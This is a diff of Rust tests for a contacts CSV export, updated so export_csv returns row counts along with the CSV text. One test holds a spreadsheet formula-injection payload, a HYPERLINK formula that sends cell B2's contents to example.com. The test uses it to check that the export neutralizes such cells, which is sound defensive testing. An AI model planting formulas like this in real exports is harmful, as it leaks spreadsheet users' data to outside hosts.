@@ -1098,7 +1098,9 @@ async fn export_writes_one_row_per_identity_with_the_contact_repeated() {
         .await
         .unwrap();
 
-    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+    let written = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+    assert_eq!((written.contacts, written.identities), (3, 4));
+    let text = written.csv;
     assert_eq!(
         text,
         format!(
@@ -1112,9 +1114,10 @@ async fn export_writes_one_row_per_identity_with_the_contact_repeated() {
     );
 
     let only: HashSet<i64> = [unknown].into();
-    let text = export_csv(&mut conn, ACCOUNT, Some(&only)).await.unwrap();
+    let written = export_csv(&mut conn, ACCOUNT, Some(&only)).await.unwrap();
+    assert_eq!((written.contacts, written.identities), (1, 1));
     assert_eq!(
-        text,
+        written.csv,
         format!("{HEADER}\n{unknown},,,phone,phone,'+15555550101\n")
     );
 }
@@ -1154,7 +1157,7 @@ async fn an_export_loaded_straight_back_changes_nothing() {
         .unwrap();
 
     let before = picture(&mut conn).await;
-    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap().csv;
     for mode in [LoadMode::Append, LoadMode::Edit] {
         let counts = loaded(&mut conn, &text, mode).await;
         assert_eq!(counts, LoadCounts::default(), "{mode:?}");
@@ -1167,7 +1170,7 @@ async fn an_export_loaded_straight_back_changes_nothing() {
                 .unwrap();
         assert_eq!(touched, 0, "{mode:?}");
         assert_eq!(
-            export_csv(&mut conn, ACCOUNT, None).await.unwrap(),
+            export_csv(&mut conn, ACCOUNT, None).await.unwrap().csv,
             text,
             "{mode:?}"
         );
@@ -1360,7 +1363,7 @@ async fn export_writes_a_quote_before_a_cell_a_spreadsheet_would_run() {
     .await;
     join_group(&mut conn, ada, "+Work").await;
 
-    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap().csv;
     let cell = "\"'=HYPERLINK(\"\"http://example.com/?\"\"&B2,\"\"Ada\"\")\"";
     assert_eq!(
         text,
@@ -1395,13 +1398,13 @@ async fn a_quoted_cell_loaded_straight_back_changes_nothing() {
         .unwrap();
 
     let before = picture(&mut conn).await;
-    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap().csv;
     for mode in [LoadMode::Append, LoadMode::Edit] {
         let counts = loaded(&mut conn, &text, mode).await;
         assert_eq!(counts, LoadCounts::default(), "{mode:?}");
         assert_eq!(picture(&mut conn).await, before, "{mode:?}");
         assert_eq!(
-            export_csv(&mut conn, ACCOUNT, None).await.unwrap(),
+            export_csv(&mut conn, ACCOUNT, None).await.unwrap().csv,
             text,
             "{mode:?}"
         );
@@ -1483,7 +1486,7 @@ async fn an_export_libreoffice_saved_again_changes_nothing() {
     .await;
     join_group(&mut conn, ada, "+Work").await;
     let before = picture(&mut conn).await;
-    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap().csv;
 
     let mut reader = csv::Reader::from_reader(text.as_bytes());
     let mut writer = csv::WriterBuilder::new()
